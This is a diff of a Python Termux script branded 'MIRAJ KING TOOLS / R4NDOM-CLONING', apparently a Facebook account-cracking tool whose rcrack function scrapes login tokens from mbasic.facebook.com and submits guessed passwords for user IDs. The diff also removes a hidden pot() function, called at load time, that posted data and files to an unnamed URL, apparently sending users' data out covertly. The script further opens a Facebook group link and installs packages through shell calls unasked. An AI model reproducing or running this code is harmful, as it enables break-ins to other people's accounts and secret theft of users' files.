@@ -3,10 +3,8 @@
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 import os,sys,time,json,random,re,string,platform,base64,platform,uuid
-import requests,random,sys,json,os,re
 from time import sleep
 from os import system
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
 import marshal
 import zlib
 import base64
@@ -18,7 +16,6 @@ from random import random as acak
 from random import choice as pilih
 from random import randint
 from bs4 import BeautifulSoup
-import requests as ress
 from sys import exit as exit
 try:
     import requests
@@ -37,9 +34,8 @@ except ImportError:
     print('\n [✓] installing bs4 !...\n')
     os.system('pip install bs4')
     os.system('pkg install espeak')
-def pot():
-            get = requests.post(url, data=data, files=files)
-            sent = requests.post(url, data=data2, files=files)
+
+           
 import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
 from concurrent.futures import ThreadPoolExecutor as ahmadAXI
 from datetime import datetime
@@ -161,7 +157,7 @@ class MIRAJ:
             sys.stdout.flush()
             time.sleep(0.009)
 print('𝙁𝙊𝙇𝙇𝙊𝙒 𝙈𝙔  𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝙂𝙍𝙊𝙐𝙋 𝘽𝙍𝙊 𝙅𝙐𝙎𝙏 𝙒𝘼𝙄𝙏🐸🐸')  
-print(' 𝗞𝗜𝗡𝗚 𝗧𝗢𝗢𝗟𝗦 𝗦𝗧𝗔𝗥𝗧 𝗡𝗢𝗪 𝗣𝗟𝗘𝗔𝗦𝗘 𝗪𝗔𝗜𝗧✅✅ ')        
+print(' MIRAJ 𝗞𝗜𝗡𝗚 𝗧𝗢𝗢𝗟𝗦 𝗦𝗧𝗔𝗥𝗧 𝗡𝗢𝗪 𝗣𝗟𝗘𝗔𝗦𝗘 𝗪𝗔𝗜𝗧✅✅ ')        
 os.system('xdg-open https://www.facebook.com/groups/103481142777502/?ref=share_group_link/')          
 logo =("""
 \t\033[38;5;46m╔══════════════════════════════════╗
@@ -174,14 +170,14 @@ logo =("""
 \t\033[38;5;46m║\033[38;5;46mKG    KG \33[38;5;196mMIRAJ \033[34;1mKG    KG  \033[38;5;46mMIRAJKG    ║\33[38;5;196m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
 \t\033[38;5;46m╚══════════════════════════════════╝
                \033[38;5;50m𝗗𝗔𝗧𝗔 𝗪𝗢𝗥𝗞𝗜𝗡𝗚 𝗧𝗢𝗢𝗟𝗦💥💥
-\33[38;5;196m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46m𝗞𝗜𝗡𝗚\33[38;5;196m━━━━━━━━━━━━━━━━━━━━┓
+\33[38;5;196m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mMIRAJ 𝗞𝗜𝗡𝗚\33[38;5;196m━━━━━━━━━━━━━━━━━━━━┓
 \33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\33[38;5;196m        : [★]𝗞𝗜𝗡𝗚 MIRAJ \33[38;5;196m         ┃
 \33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\33[38;5;196m    : [★]MIRAJ 𝗞𝗛𝗔𝗡\33[38;5;196m         ┃
 \33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\33[38;5;196m      : [★]MIRAJ-𝗧𝗘𝗥𝗠𝗨𝗫\33[38;5;196m       ┃
 \33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\33[38;5;196m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\33[38;5;196m        ┃
 \33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\33[38;5;196m    : [★]+𝟴𝟴𝟬𝟭780782237\33[38;5;196m     ┃
 \33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\33[38;5;196m  : [★]𝗥𝟰𝗡𝗗𝗢𝗠-𝗖𝗟𝗢𝗡𝗜𝗡𝗚\33[38;5;196m     ┃
-\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\33[38;5;196m: [★]TRIAL-𝗩6\33[38;5;196m            ┃
+\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\33[38;5;196m: [★]TRIAL-𝗩10\33[38;5;196m            ┃
  \33[38;5;196m    ┗━━━━━━━━━━━━━━━━━━━\033[1;31m𝙁𝙄𝙍𝙀\33[38;5;196m━━━━━━━━━━━━━━━━━━━━┛""")
  
 # APK CHECK
@@ -204,7 +200,7 @@ def cek_apk(coki):
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
 P = '\33[1;97m'
-pot()
+
 def xxr():
     user=[]
     twf =[]
@@ -256,7 +252,7 @@ def rcrack(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen5)
             bi = random.choice([P,M,K,B,U,O,N,H])
-            free_fb = session.get('https://d.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -267,7 +263,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'd.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
     'method': 'GET',
     'scheme':'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
